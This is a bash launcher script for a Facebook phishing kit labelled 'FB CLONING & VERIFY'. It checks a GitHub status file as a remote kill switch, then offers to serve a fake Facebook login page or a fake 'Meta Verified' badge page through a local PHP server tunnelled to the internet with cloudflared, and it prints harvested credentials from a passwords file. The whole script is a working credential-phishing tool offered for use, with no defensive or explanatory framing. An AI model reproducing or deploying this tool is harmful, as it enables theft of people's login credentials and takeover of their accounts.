#!/bin/bash

# --- REMOTE CONTROL ---
# Sinthani link iyi kukhala RAW link yako ya ku GitHub
STATUS=$(curl -s -L https://raw.githubusercontent.com/hunteroxe1-ai/PEkha/main/status.txt | tr -d '[:space:]')

if [[ "$STATUS" == "OFF" ]]; then
    clear
    echo -e "\e[1;31m [!] ACCESS DENIED: Tool is disabled by Phillimon.\e[0m"
    exit
fi

# --- BANNER DESIGN (HUNTER~OXE) ---
clear
echo -e "\e[1;32m   _  _ _  _ _  _ ___ ____ ____    ____ _  _ ____ "
echo -e "\e[1;32m   |__| |  | |\ |  |  |___ |__/    |  |  \/  |___ "
echo -e "\e[1;32m   |  | |__| | \|  |  |___ |  \    |__| _/\_ |___  v/4.4"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;35m  [*] OWNER    : PHILLIMON ISAAC"
echo -e "\e[1;35m  [*] TOOL TYPE: FB CLONING & VERIFY"
echo -e "\e[1;35m  [*] VERSION  : PREMIUM"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;32m  [1] FB LOGIN (CLASSIC PHISH)"
echo -e "\e[1;32m  [2] META VERIFIED (BLUE BADGE)"
echo -e "\e[1;32m  [3] VIEW CAPTURED DATA"
echo -e "\e[1;32m  [4] EXIT TOOLS"
echo -e "\e[1;37m  --------------------------------------------------"
read -p "[?] CHOICE : " choice

if [ "$choice" == "1" ]; then
    cp web/classic.html web/index.html
    echo -e "\e[1;33m[!] Starting Classic FB Phish...\e[0m"
    php -S 127.0.0.1:8080 -t web/ & cloudflared tunnel --url http://127.0.0.1:8080
elif [ "$choice" == "2" ]; then
    cp web/badge.html web/index.html
    echo -e "\e[1;34m[!] Starting Meta Verified Page...\e[0m"
    php -S 127.0.0.1:8080 -t web/ & cloudflared tunnel --url http://127.0.0.1:8080
elif [ "$choice" == "3" ]; then
    cat storage/passwords.txt
elif [ "$choice" == "4" ]; then
    exit
fi
